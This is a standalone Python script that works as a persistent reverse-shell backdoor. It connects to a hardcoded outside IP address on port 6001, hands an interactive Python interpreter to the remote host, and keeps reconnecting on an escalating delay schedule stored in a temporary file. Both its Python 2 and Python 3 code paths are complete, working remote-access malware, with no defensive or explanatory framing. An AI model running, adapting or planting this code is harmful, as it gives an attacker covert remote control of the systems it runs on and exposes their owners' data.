#!/usr/bin/env python2
import socket
import subprocess
import time
import os
import sys
import select
import fcntl
import errno
import signal

file_path = '/tmp/mbin'
re_five_count = 0
re_thirty_count = 0
DEFAULT_DELAY = 60
tip = "185.196.11.235"
port = 6001

def sleepread():
    if os.path.isfile(file_path):
        with open(file_path, 'r') as file:
            content = file.read().strip()
            number = int(content)
        return number
    else :
        with open(file_path, 'w') as file:
            file.write(str(60))
        return 60
    
def sleepwrite(time):
    with open(file_path, 'w') as file:
        file.write(str(time)) 

def reconnect():
    global re_five_count, re_thirty_count, DEFAULT_DELAY
    re_five_count = 0
    re_thirty_count = 0
    s = None
    sh = None
    while True:
        # print("reconnect")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((tip, port))
            s.settimeout(1800)
            # print("Connection successful")
            sh = subprocess.Popen(
                ["/usr/bin/python3", "-i"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=False,
                bufsize=0  # unbuffered
            )

            # Make stdout non-blocking
            fd = sh.stdout.fileno()
            os.set_blocking(fd, False)

            start_symbol = b'>>>'
            # Forward data between socket and process
            while True:
                s.send(start_symbol)
                # print("waiting for receiving data")
                data = s.recv(1024)
                # print("received data")
                re_five_count = 0
                re_thirty_count = 0
                DEFAULT_DELAY = 60
                if len(data) == 0:
                    break
                sh.stdin.write(data)
                sh.stdin.flush()

                while True:
                    ready, _, _ = select.select([sh.stdout], [], [], 0.1)
                    if sh.stdout in ready:
                        output = sh.stdout.readline()
                        # print(output)
                        if not output:
                            break
                        
                        s.send(output)
                    else:
                        break
            # print("terminate")
            if sh is not None:
                sh.terminate()
                sh.wait(timeout=5)  # Wait up to 5 seconds; adjust as needed
                if sh.poll() is None:  # Check if it's still running
                    sh.kill()
                    sh.wait()
                sh = None
        except Exception as e:
            # traceback.print_exc()
            # print("Exception")
            # print(e)
            try :
                if s is not None:
                    s.close()
                tnum = sleepread()
                if tnum == 60:
                    if re_five_count < 5:
                        DEFAULT_DELAY = 60
                        re_five_count += 1
                    elif re_thirty_count < 3:
                        DEFAULT_DELAY = 300
                        re_thirty_count += 1
                    else:
                        DEFAULT_DELAY = 1800
                else:
                    DEFAULT_DELAY = tnum
                    sleepwrite(60)
                    re_five_count = 0
                    re_thirty_count = 0
                if sh is not None:
                    print("not None")
                    sh.terminate()
                    sh.wait(timeout=5)  # Wait up to 5 seconds; adjust as needed
                    if sh.poll() is None:  # Check if it's still running
                        sh.kill()
                        sh.wait()
                    sh = None
            except Exception:
                pass
            time.sleep(DEFAULT_DELAY)

def reconnect27():
    global re_five_count, re_thirty_count, DEFAULT_DELAY
    re_five_count = 0
    re_thirty_count = 0
    while True:
        # print("reconnect")
        s = None
        sh = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1800)
            s.connect((tip, port))
            s.settimeout(None)
            # print("Connection successful")

            sh = subprocess.Popen(
                ["/usr/bin/python", "-i"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=False,
                bufsize=0
            )
            fd = sh.stdout.fileno()
            fl = fcntl.fcntl(fd, fcntl.F_GETFL)
            fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)
            start_symbol = '>>>'
            while True:
                s.send(start_symbol)
                print("waiting for receiving data")
                data = s.recv(1024)
                print("received data")
                re_five_count = 0
                re_thirty_count = 0
                if len(data) == 0:
                    break
                sh.stdin.write(data)
                sh.stdin.flush()
                while True:
                    ready, _, _ = select.select([sh.stdout], [], [], 0.1)
                    if sh.stdout in ready:
                        try:
                            output = sh.stdout.read(1024)
                            if not output:
                                raise Exception("EOF from shell")
                            # print(output)
                            s.send(output)
                        except IOError as e:
                            if e.errno not in (errno.EAGAIN, errno.EWOULDBLOCK):
                                raise
                    else:
                        break
            if sh is not None:
                try:
                    os.kill(sh.pid, signal.SIGTERM)
                except:
                    pass
                sh.wait()
                if sh.poll() is None:
                    sh.kill()
                    sh.wait()
        except Exception as e:
            # traceback.print_exc()
            if s is not None:
                try:
                    s.close()
                except:
                    pass
            tnum = sleepread()
            if tnum == 60:
                if re_five_count < 5:
                    DEFAULT_DELAY = 60
                    re_five_count += 1
                elif re_thirty_count < 3:
                    DEFAULT_DELAY = 300
                    re_thirty_count += 1
                else:
                    DEFAULT_DELAY = 1800
            else:
                DEFAULT_DELAY = tnum
                sleepwrite(60)
                re_five_count = 0
                re_thirty_count = 0
            if sh is not None:
                try:
                    os.kill(sh.pid, signal.SIGTERM)
                except:
                    pass
                sh.wait()
                if sh.poll() is None:
                    sh.kill()
                    sh.wait()
            time.sleep(DEFAULT_DELAY)

if __name__ == "__main__":
    if sys.version_info >= (3, 0):
        reconnect()
    else:
        reconnect27()
